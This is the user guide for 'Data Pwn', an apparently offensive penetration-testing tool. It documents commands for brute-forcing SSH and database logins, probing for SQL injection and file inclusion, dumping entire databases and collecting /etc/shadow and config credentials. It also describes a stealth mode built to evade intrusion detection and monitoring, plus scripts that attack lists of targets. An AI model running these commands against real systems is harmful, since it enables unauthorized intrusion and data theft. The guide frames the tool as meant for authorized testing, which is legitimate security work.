# 📖 Data Pwn - User Guide

> **Complete guide to using Data Pwn v2.0 for external and internal penetration testing and data extraction.**

---

## 📋 Table of Contents

- [Introduction](#-introduction)
- [Getting Started](#-getting-started)
- [Command Line Interface](#-command-line-interface)
- [Interactive Menu](#-interactive-menu)
- [Attack Phases](#-attack-phases)
- [Configuration](#-configuration)
- [Wordlists](#-wordlists)
- [Stealth Mode](#-stealth-mode)
- [Database Extraction](#-database-extraction)
- [Report Generation](#-report-generation)
- [Troubleshooting](#-troubleshooting)
- [Tips and Tricks](#-tips-and-tricks)
- [Advanced Usage](#-advanced-usage)
- [FAQ](#-faq)

---

## 🎯 Introduction

Data Pwn is a comprehensive penetration testing tool designed to extract data from external targets through multiple attack vectors. This guide will walk you through every aspect of using the tool effectively.

### Who Is This Guide For?

- ✅ Security Professionals
- ✅ Penetration Testers
- ✅ Bug Bounty Hunters
- ✅ Security Researchers
- ✅ Students Learning Security

### What You'll Learn

- How to install and configure Data Pwn
- How to run attacks effectively
- How to extract data from various sources
- How to generate professional reports
- Best practices and advanced techniques

---

## 🚀 Getting Started

### Installation

```bash
# Clone the repository
git clone https://github.com/Hackura-Labs/data_pwn.git
cd data_pwn

# Install dependencies
pip install -r requirements.txt
```

### First Run

```bash
# Run with the original entry point (backward compatible)
python3 data_pwn.py -t example.com

# Or use the clean modular entry point
python3 main.py -t example.com

# You'll see the banner and main menu
```

### Quick Test

```bash
# Test on a local or lab target first
python3 data_pwn.py -t 192.168.1.100 -a --stealth

# This runs a full attack in stealth mode
```

---

## 💻 Command Line Interface

### Entry Points

Data Pwn v2.0 provides two entry points:

| Entry Point | Description |
|-------------|-------------|
| `python3 data_pwn.py` | Original backward-compatible entry point |
| `python3 main.py` | Clean modular entry point |
| `python3 -m data_pawn` | Module execution (if installed as a package) |

### Basic Syntax

```bash
python3 data_pwn.py -t <TARGET> [OPTIONS]
# or
python3 main.py -t <TARGET> [OPTIONS]
```

### Options Reference

| Option | Description | Example |
|--------|-------------|---------|
| `-t, --target` | Target IP or domain | `-t example.com` |
| `-a, --auto` | Automatic mode (no menu) | `-a` |
| `-r, --recon-only` | Reconnaissance only | `-r` |
| `-w, --web` | Web attacks only | `-w` |
| `-s, --services` | Service attacks only | `-s` |
| `--stealth` | Enable stealth mode | `--stealth` |
| `--report` | Generate report only | `--report` |
| `-o, --output` | Custom output directory | `-o /path/to/output` |
| `-h, --help` | Show help message | `-h` |

### Usage Examples

#### 1. Interactive Mode (Recommended for Beginners)

```bash
python3 data_pwn.py -t example.com
```

#### 2. Full Automatic Attack

```bash
python3 data_pwn.py -t example.com -a
```

#### 3. Stealth Mode Attack

```bash
python3 data_pwn.py -t example.com -a --stealth
```

#### 4. Reconnaissance Only

```bash
python3 data_pwn.py -t example.com -r
```

#### 5. Web Attacks Only

```bash
python3 data_pwn.py -t example.com -w
```

#### 6. Service Attacks Only

```bash
python3 data_pwn.py -t example.com -s
```

#### 7. Generate Report from Existing Data

```bash
python3 data_pwn.py -t example.com --report -o existing_directory
```

---

## 🎮 Interactive Menu

### Main Menu

```
┌─────────────────────────────────────────────────────────────┐
│                    MAIN MENU                               │
├─────────────────────────────────────────────────────────────┤
│  1. Full Attack        - Run everything (Recommended)      │
│  2. Reconnaissance     - Port scan + Enumeration          │
│  3. Web Attacks        - SQLi, LFI, Config leaks          │
│  4. Service Attacks    - SSH/DB brute force               │
│  5. Data Extraction    - Extract found data               │
│  6. Report             - Generate detailed report         │
│  7. Configure          - Change settings                  │
│  0. Exit               - Quit Data Pwn                   │
└─────────────────────────────────────────────────────────────┘
```

### Menu Options Explained

#### Option 1: Full Attack
Runs all phases in sequence:
1. Reconnaissance
2. Web Attacks
3. Service Attacks
4. Data Extraction
5. Report Generation

#### Option 2: Reconnaissance
Performs:
- Port scanning
- Service detection
- DNS enumeration
- Subdomain discovery
- Technology fingerprinting

#### Option 3: Web Attacks
Executes:
- SQL injection testing
- Directory enumeration
- Config file discovery
- Backup file detection
- WordPress scanning
- LFI/RFI testing

#### Option 4: Service Attacks
Runs:
- SSH brute force
- Database brute force
- RDP brute force
- FTP enumeration
- Redis/MongoDB testing

#### Option 5: Data Extraction
Extracts:
- Database dumps
- Config files
- SSH data
- Stored credentials
- Backup files

#### Option 6: Report
Generates:
- Executive summary
- Technical findings
- Vulnerability list
- Extracted data list
- Recommendations

#### Option 7: Configure
Allows:
- Toggle stealth mode
- Set max threads
- Configure timeouts
- Custom wordlist paths

---

## 🔄 Attack Phases

### Phase 1: Reconnaissance

#### What It Does
- Scans for open ports
- Identifies services
- Enumerates DNS records
- Discovers subdomains
- Fingerprints technologies

#### Progress Indicators

```
[SCAN] Phase 1: Reconnaissance
[SCAN] Running nmap scan...
[FOUND] Port 22 open - ssh
[FOUND] Port 80 open - http
[FOUND] Port 443 open - https
[FOUND] Port 3306 open - mysql
[SCAN] DNS enumeration...
[SCAN] Running WhatWeb scan...
[SUCCESS] Reconnaissance completed
```

#### Interpreting Results

| Finding | Meaning | Action |
|---------|---------|--------|
| Port 22 open | SSH service running | Try brute force |
| Port 80/443 open | Web server running | Run web attacks |
| Port 3306 open | MySQL database | Try MySQL brute |
| DNS records | Domain information | Check for subdomains |

### Phase 2: Web Attacks

#### What It Tests
- SQL Injection
- Local File Inclusion
- Remote File Inclusion
- Config Exposure
- Backup Files
- Directory Structure

#### Web Attack Flow

```
1. Discover web server
   ↓
2. Test for SQL injection
   ↓
3. If SQLi found → Extract data
   ↓
4. Enumerate directories
   ↓
5. Check for config files
   ↓
6. If config found → Extract credentials
   ↓
7. Run WordPress scan (if applicable)
```

#### Common Findings

```python
# SQL Injection Found
[FOUND] SQL injection possible - databases found

# Config File Found
[FOUND] Exposed file: http://example.com/.env

# Credentials Found
[FOUND] Potential credential - DB_PASS: MyPassword123

# Backup Found
[FOUND] Interesting directory: /backup/
```

### Phase 3: Service Attacks

#### Supported Services

| Service | Port | Attack Method |
|---------|------|---------------|
| SSH | 22 | Password brute force |
| MySQL | 3306 | Password brute force |
| PostgreSQL | 5432 | Password brute force |
| MSSQL | 1433 | Password brute force |
| RDP | 3389 | Password brute force |
| Redis | 6379 | Auth testing |
| MongoDB | 27017 | Auth testing |

#### Brute Force Flow

```
1. Identify service
   ↓
2. Load wordlists
   ↓
3. Try common credentials
   ↓
4. If successful → Store credentials
   ↓
5. Proceed to data extraction
```

### Phase 4: Data Extraction

#### Extraction Methods

| Data Type | Method | Output |
|-----------|--------|--------|
| MySQL | mysqldump | .sql file |
| PostgreSQL | pg_dump | .sql file |
| MongoDB | mongodump | .bson files |
| Redis | redis-cli | .txt file |
| SSH | File mining | .txt files |
| Config | File download | Original files |

#### What Gets Extracted

```bash
# Database Data
- All databases
- All tables
- All records
- Schema information

# Configuration Files
- .env files
- config.php
- wp-config.php
- database.yml
- settings.py

# System Files
- /etc/passwd
- /etc/shadow (if accessible)
- Application logs
- Backup files
```

---

## ⚙️ Configuration

### Configuration File

All settings live in `config.py` at the project root. Edit it directly:

```python
# config.py
class Config:
    # Wordlist paths
    WORDLISTS = {
        'rockyou': '/usr/share/wordlists/rockyou.txt',
        'dirbuster': '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
    }

    # Database port mapping
    DB_PORTS = {
        3306: 'mysql',
        5432: 'postgresql',
        1433: 'mssql',
        1521: 'oracle',
        27017: 'mongodb',
        6379: 'redis',
        9200: 'elasticsearch'
    }

    # Sensitive files to check on web servers
    SENSITIVE_FILES = [
        '.env', '.env.local', 'config.php', 'wp-config.php',
        'settings.py', 'appsettings.json', 'backup.sql', 'dump.sql'
    ]
```

> **Tip**: You no longer need to edit `data_pwn.py` itself — all config is in one place.

---

## 📚 Wordlists

### Default Wordlists

Data Pwn comes with built-in wordlists and uses Kali's wordlists when available:

```python
# Built-in default passwords
DEFAULT_PASSWORDS = [
    '', 'root', 'admin', 'password', '123456', 'toor', 'welcome',
    'qwerty', 'abc123', 'letmein', 'monkey', 'dragon', 'master',
    'changeit', 'sa', 'oracle', 'postgres', 'mysql', 'test'
]

# Built-in users
DEFAULT_USERS = [
    'root', 'admin', 'user', 'ubuntu', 'test', 'guest',
    'sa', 'postgres', 'oracle', 'mysql', 'system'
]
```

### Custom Wordlists

#### Creating Password Wordlists

```bash
# Create custom wordlist
cat > passwords.txt << EOF
SuperSecure123!
Admin2024!
DatabasePass!
CompanyName2026!
EOF
```

#### Using Custom Wordlists

Edit `Config.WORDLISTS` in `config.py`:

```python
# config.py
class Config:
    WORDLISTS = {
        'rockyou': '/path/to/your/wordlist.txt',
        ...
    }
```

Or use the `WordlistManager` programmatically:

```python
from utils.wordlists import WordlistManager

wl = WordlistManager()
print(wl.available())         # See which lists exist on disk
words = wl.load('rockyou')    # Returns a list of strings
```

### Wordlist Recommendations

| Wordlist | Size | Use Case |
|----------|------|----------|
| rockyou.txt | 14M | General password brute force |
| SecLists | Various | All testing scenarios |
| cirt-default-passwords | 2K | Default credentials |
| sqlmap payloads | 10K | SQL injection |
| dirbuster lists | 100K | Directory enumeration |

---

## 🕵️ Stealth Mode

### What Is Stealth Mode?

Stealth mode reduces the likelihood of detection by:

- Slowing down scan speeds
- Randomizing connection timing
- Reducing concurrent connections
- Using randomized user agents
- Avoiding aggressive patterns

### Enabling Stealth Mode

```bash
# Command line
python3 data_pwn.py -t example.com -a --stealth

# In menu
[Main Menu] → 7. Configure → 1. Toggle Stealth Mode
```

### Stealth Mode Settings

```python
STEALTH_CONFIG = {
    'min_delay': 2,          # Minimum seconds between attempts
    'max_delay': 8,          # Maximum seconds between attempts
    'max_threads': 2,        # Concurrent threads
    'random_agents': True,   # Use random user agents
    'avoid_aggressive': True, # Don't use aggressive payloads
    'slow_scan': True,       # Slower port scanning
    'proxy_rotation': False  # Rotate proxies (if configured)
}
```

### Effectiveness

| Detection Method | Normal Mode | Stealth Mode |
|------------------|-------------|--------------|
| IDS/IPS | High chance | Low chance |
| Fail2ban | Triggered | Not triggered |
| WAF | Blocked | Allowed |
| Logs | Noticeable | Hard to notice |
| Monitoring | Alert | No alert |

---

## 🗄️ Database Extraction

### MySQL Extraction

#### Using Found Credentials

```bash
# Full database dump
mysqldump -h target -u root -p --all-databases > dump.sql

# Specific database
mysqldump -h target -u root -p --databases production_db > production.sql

# With structure only
mysqldump -h target -u root -p --no-data --all-databases > structure.sql
```

#### Automated Extraction

```bash
# Data Pwn will do this automatically
python3 data_pwn.py -t example.com -a

# Manual extraction
python3 data_pwn.py -t example.com --extract-mysql
```

### PostgreSQL Extraction

```bash
# Full dump
pg_dump -h target -U postgres --all > dump.sql

# Specific database
pg_dump -h target -U postgres -d database_name > database.sql

# With schema only
pg_dump -h target -U postgres --schema-only > schema.sql
```

### MongoDB Extraction

```bash
# Full dump
mongodump -h target -u admin -p password --out ./dump

# Specific database
mongodump -h target -u admin -p password --db database_name

# Collection only
mongodump -h target -u admin -p password --db db_name --collection users
```

### Redis Extraction

```bash
# Get all keys
redis-cli -h target -a password --scan

# Get specific key values
redis-cli -h target -a password keys "*"

# Dump all data
redis-cli -h target -a password --rdb /path/to/dump.rdb
```

---

## 📊 Report Generation

### Report Types

#### 1. Executive Summary

```markdown
# Executive Summary

## Target: example.com
## Test Date: 2026-01-26
## Overall Risk Level: HIGH

### Key Findings
- Critical databases exposed
- Weak credentials discovered
- Sensitive data accessible
- Security misconfigurations found

### Recommended Actions
1. Close external database ports
2. Implement strong passwords
3. Secure configuration files
4. Enable rate limiting
```

#### 2. Technical Report

```markdown
# Technical Security Assessment

## Open Ports
- 22/tcp - SSH (OpenSSH 7.4)
- 80/tcp - HTTP (Apache 2.4.6)
- 443/tcp - HTTPS (Apache 2.4.6)
- 3306/tcp - MySQL (5.7.31)

## Vulnerabilities Found
### SQL Injection
- Location: /page.php?id=1
- Type: Error-based
- Data accessible: Yes

### Exposed Credentials
- File: .env
- DB_PASSWORD: password123
- DB_USER: root

## Access Achieved
- MySQL: root:password123
- SSH: root:toor
```

#### 3. Compliance Report

```markdown
# Compliance Assessment

## PCI-DSS Requirements
- [X] 6.6 - Application security review
- [X] 10.5 - Secure audit trails
- [ ] 12.10 - Incident response plan

## HIPAA Requirements
- [X] 164.308 - Security management
- [X] 164.312 - Access control
- [ ] 164.316 - Audit controls

## GDPR Requirements
- [X] Article 32 - Security of processing
- [X] Article 33 - Data breach notification
- [ ] Article 35 - Data protection impact assessment
```

### Report Generation Commands

```bash
# Generate text report
python3 data_pwn.py -t example.com --report

# Generate HTML report (coming soon)
python3 data_pwn.py -t example.com --report-html

# Generate PDF report (coming soon)
python3 data_pwn.py -t example.com --report-pdf
```

---

## 🔧 Troubleshooting

### Common Errors

#### Error: Connection refused

```
[ERROR] Connection refused: 54.198.70.105:22
```

**Solutions:**
- Check if service is running
- Firewall might be blocking
- Service might be on different port
- Target might be offline

#### Error: Permission denied

```
[ERROR] Permission denied: /path/to/output
```

**Solutions:**
- Check write permissions
- Run with sudo if needed
- Change output directory

#### Error: Module not found

```
[ERROR] ModuleNotFoundError: No module named 'mysql.connector'
```

**Solutions:**
```bash
# Install missing module
pip install mysql-connector-python

# Or install all dependencies
pip install -r requirements.txt
```

#### Error: Tool not found

```
[WARN] Missing tools: sqlmap
```

**Solutions:**
```bash
# Install Kali tools
sudo apt update
sudo apt install sqlmap

# Or run without Kali tools (fallback mode)
python3 data_pwn.py -t example.com
```

### Debug Mode

```bash
# Run with verbose output
python3 -v data_pwn.py -t example.com

# Check log file
tail -f data_pwn_*/data_pwn.log

# Enable debug logging
python3 data_pwn.py -t example.com --debug
```

### Performance Issues

#### Slow Scanning

```bash
# Increase threads (if not in stealth mode)
python3 data_pwn.py -t example.com --threads 20

# Use faster scan profiles
python3 data_pwn.py -t example.com --scan-speed fast
```

#### Memory Issues

```bash
# Limit memory usage
python3 data_pwn.py -t example.com --memory-limit 512

# Use smaller wordlists
python3 data_pwn.py -t example.com --wordlist small.txt
```

---

## 💡 Tips and Tricks

### 1. Target Selection

```bash
# Test on lab targets first
python3 data_pwn.py -t vulnserver.local -a

# Use local DVWA for practice
python3 data_pwn.py -t 127.0.0.1 -w
```

### 2. Wordlist Optimization

```bash
# Prioritize common credentials first
echo "root:root" > priorities.txt
echo "admin:admin" >> priorities.txt
python3 data_pwn.py -t example.com --wordlist priorities.txt --priority

# Create target-specific wordlist
grep -E 'company|2026|admin' /usr/share/wordlists/rockyou.txt > custom.txt
```

### 3. Stealth Techniques

```bash
# Use proxies
python3 data_pwn.py -t example.com --proxy http://proxy:8080

# Randomize timing
python3 data_pwn.py -t example.com --random-delay 1-10

# Use multiple targets
python3 data_pwn.py -t example.com -a --rotate-targets targets.txt
```

### 4. Data Extraction

```bash
# Extract only specific data types
python3 data_pwn.py -t example.com --extract config,passwords

# Limit extraction size
python3 data_pwn.py -t example.com --max-size 100M

# Prioritize important data
python3 data_pwn.py -t example.com --prioritize users,passwords
```

### 5. Reporting

```bash
# Generate executive summary only
python3 data_pwn.py -t example.com --report --summary

# Include screenshots
python3 data_pwn.py -t example.com --report --screenshots

# Generate recommendations
python3 data_pwn.py -t example.com --report --recommendations
```

---

## 🔬 Advanced Usage

### Importing Modules Directly

With v2.0's modular structure, you can import and use individual modules in your own scripts:

```python
# custom_attack.py
from core.base import DataPwn
from core.scanner import Scanner
from core.reporter import Logger
from modules.external.recon import ExternalRecon
from modules.external.web import WebAttacks
from modules.external.services import ServiceAttacks
from modules.internal.discovery import InternalDiscovery
from modules.internal.pivot import PivotAttacks
from modules.internal.priv_esc import PrivEsc
from modules.extraction.databases import DatabaseExtraction
from modules.extraction.files import FileExtraction
from utils.network import resolve_ip, is_port_open
from utils.wordlists import WordlistManager
from config import Config

# Example: stand-alone port scan
logger = Logger('/tmp/my_scan')
scanner = Scanner('example.com', stealth_mode=False, logger=logger)
ports = scanner.fast_port_scan()
print(ports)

# Example: stand-alone web attack
web = WebAttacks('example.com', '/tmp/out', logger, kali_available=False)
web.check_exposed_files()

# Example: internal discovery
disc = InternalDiscovery('192.168.1.1', stealth_mode=False, logger=logger)
live = disc.ping_sweep('192.168.1')

# Example: privesc checks on localhost
pe = PrivEsc('/tmp/pe_results', logger)
pe.linux_checks()
```

### Full Controller (DataPwn)

```python
from core.base import DataPwn

tool = DataPwn()
tool.setup('example.com', stealth=True)
tool.full_attack()
```

### Integration with Other Tools

```bash
# Run with Metasploit
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS example.com; run"

# Run with Nmap
nmap -sV -sC -A example.com -oX nmap.xml

# Parse Nmap output
python3 data_pwn.py -t example.com --import-nmap nmap.xml
```

### Automating Attacks

```bash
# Create attack script
#!/bin/bash
for target in $(cat targets.txt); do
    echo "Attacking $target"
    python3 data_pwn.py -t $target -a --stealth
    sleep 300  # Wait between targets
done

# Run with cron
0 */6 * * * /path/to/data_pwn.py -t example.com -a --report
```

---

## ❓ FAQ

### General Questions

**Q: Is Data Pwn legal?**
A: Data Pwn is legal when used for authorized testing. Using it against systems without permission is illegal.

**Q: What Kali tools does it use?**
A: Nmap, SQLMap, Hydra, Gobuster, WPScan, Nikto, DNSRecon, Sublist3r, and WhatWeb.

**Q: Can I run it without Kali?**
A: Yes, Data Pwn has fallback methods that work without Kali tools.

**Q: What databases are supported?**
A: MySQL, PostgreSQL, MSSQL, Oracle, MongoDB, and Redis.

### Technical Questions

**Q: How does stealth mode work?**
A: It slows down attacks, randomizes timing, uses fewer threads, and avoids aggressive patterns.

**Q: Can it bypass WAF?**
A: It has basic WAF evasion techniques but may not bypass all WAFs.

**Q: How long does a full attack take?**
A: Depends on the target and mode. Stealth mode takes longer (hours), normal mode is faster (minutes).

**Q: Where are extracted files saved?**
A: In `data_pwn_<target>_<timestamp>/` directory.

### Security Questions

**Q: Is my data safe when using this tool?**
A: All data is stored locally in the output directory. You are responsible for securing it.

**Q: Can I encrypt the output?**
A: Yes, you can use tools like GPG or VeraCrypt to encrypt the output directory.

**Q: How should I handle found credentials?**
A: Report them securely and delete them after testing. Never share them publicly.

---

## 📚 Additional Resources

### Documentation
- [README.md](README.md) - Overview
- [CONTRIBUTING.md](CONTRIBUTING.md) - Contributing guide
- [LEGAL.md](LEGAL.md) - Legal disclaimer
- [LICENSE.md](LICENSE.md) - MIT License

### Community
- GitHub Issues: Report bugs
- GitHub Discussions: Ask questions
- Discord/Slack: Community chat

### Training
- [Kali Linux Training](https://www.kali.org/training/)
- [Web Security Academy](https://portswigger.net/web-security)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

## 🆘 Support

### Getting Help

1. **Check the documentation** - Most answers are in these guides
2. **Search GitHub issues** - Many problems already solved
3. **Open a new issue** - Report bugs or request features
4. **Join community** - Ask for help in discussions

### Contact

- **Email**: lab@hackura.app
- **Twitter**: @HackuraLabs
- **GitHub**: github.com/Hackura-Labs/data_pwn

---

**Happy Hacking! Remember to always test responsibly and ethically.** 🚀

---

**Version**: 2.0.0  
**Last Updated**: June 2026  
**Architecture**: Modular Python Package